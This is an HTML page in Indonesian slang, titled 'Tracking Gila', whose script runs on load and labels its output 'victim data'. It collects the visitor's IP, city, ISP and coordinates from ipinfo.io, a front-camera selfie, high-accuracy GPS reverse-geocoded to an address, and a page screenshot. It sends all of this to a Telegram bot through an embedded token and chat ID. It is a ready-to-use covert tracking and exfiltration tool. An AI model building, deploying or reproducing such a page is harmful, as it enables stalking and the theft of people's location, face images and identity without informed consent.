<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Tracking Gila by Architect 01</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
        .container { max-width: 600px; }
        .loading { font-size: 24px; margin-bottom: 20px; }
        .details { background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #0f0; text-align: left; overflow: auto; max-height: 400px; }
        pre { margin: 0; color: #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading">🔓 MENGUMPULKAN DATA KORBAN... 🔓</div>
        <div class="details" id="details">
            <pre>Memuat...</pre>
        </div>
    </div>

    <script>
        // ==================== KONFIGURASI ====================
        const TELEGRAM_TOKEN = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Ganti dengan token bot lo
        const CHAT_ID = '6809118251';                                            // Ganti dengan chat ID lo
        const IPINFO_TOKEN = 'c2c5a23c8c5c1b';                                   // <--- GANTI DENGAN TOKEN IPINFO LO (daftar gratis di ipinfo.io)

        // ==================== FUNGSI KIRIM TELEGRAM ====================
        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch (e) { console.log('Gagal kirim pesan:', e); }
        }

        async function sendTelegramPhoto(blob, filename) {
            try {
                let fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, filename);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } catch (e) { console.log('Gagal kirim foto:', e); }
        }

        // ==================== DAPETIN DATA IP VIA IPINFO ====================
        async function getIPInfo() {
            try {
                let response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
                let data = await response.json();
                return data;
            } catch (error) {
                console.log('Gagal ambil data ipinfo:', error);
                return null;
            }
        }

        // ==================== REVERSE GEOCODING (ALAMAT DARI GPS) ====================
        async function reverseGeocode(lat, lon) {
            try {
                // Pake BigDataCloud biar akurat (gratis)
                let url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`;
                let resp = await fetch(url);
                let data = await resp.json();
                return data;
            } catch (e) {
                return null;
            }
        }

        // ==================== FUNGSI UTAMA ====================
        async function main() {
            let output = document.getElementById('details').querySelector('pre');
            let report = '';

            // 1. Dapatkan IP info
            let ipData = await getIPInfo();
            if (ipData) {
                report += '╭───── IPINFO.IO DATA ───── ⦿\n';
                report += `IP         : ${ipData.ip}\n`;
                report += `Kota       : ${ipData.city}\n`;
                report += `Region     : ${ipData.region}\n`;
                report += `Negara     : ${ipData.country}\n`;
                report += `Koordinat  : ${ipData.loc}\n`;
                report += `ISP        : ${ipData.org}\n`;
                report += `Timezone   : ${ipData.timezone}\n`;
                report += '╰─────────────────────────⦿\n\n';
            } else {
                report += '❌ Gagal ambil data ipinfo\n\n';
            }

            // Tampilkan dulu di layar
            output.innerText = report;

            // Kirim laporan awal ke Telegram
            await sendTelegramMessage(report);

            // 2. Ambil foto dari kamera depan
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 2000)); // tunggu kamera siap
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendTelegramPhoto(blob, 'selfie.jpg'), 'image/jpeg');
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                await sendTelegramMessage('❌ Gagal akses kamera: ' + e.message);
            }

            // 3. GPS tracking
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    let acc = pos.coords.accuracy;
                    let gpsMsg = `📍 GPS POSITION\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\n`;

                    // Reverse geocoding
                    let addr = await reverseGeocode(lat, lon);
                    if (addr) {
                        gpsMsg += `Alamat: ${addr.locality || addr.city || ''}, ${addr.principalSubdivision || ''}\n`;
                        gpsMsg += `Lengkap: ${addr.localityInfo?.administrative?.slice(-2).map(a => a.name).join(', ') || 'Tidak diketahui'}\n`;
                    } else {
                        gpsMsg += 'Alamat: Tidak tersedia\n';
                    }

                    await sendTelegramMessage(gpsMsg);
                    output.innerText += '\n' + gpsMsg;
                }, (err) => {
                    sendTelegramMessage('❌ GPS error: ' + err.message);
                }, { enableHighAccuracy: true, timeout: 10000 });
            } else {
                sendTelegramMessage('❌ Geolocation tidak didukung');
            }

            // 4. Screenshot halaman (opsional)
            setTimeout(async () => {
                try {
                    let canvas = await html2canvas(document.body);
                    canvas.toBlob(blob => sendTelegramPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
                } catch (e) {}
            }, 5000);
        }

        // Load html2canvas dari CDN (tambahkan di head atau di sini)
        let script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        script.onload = main;
        document.head.appendChild(script);
    </script>
</body>
</html>
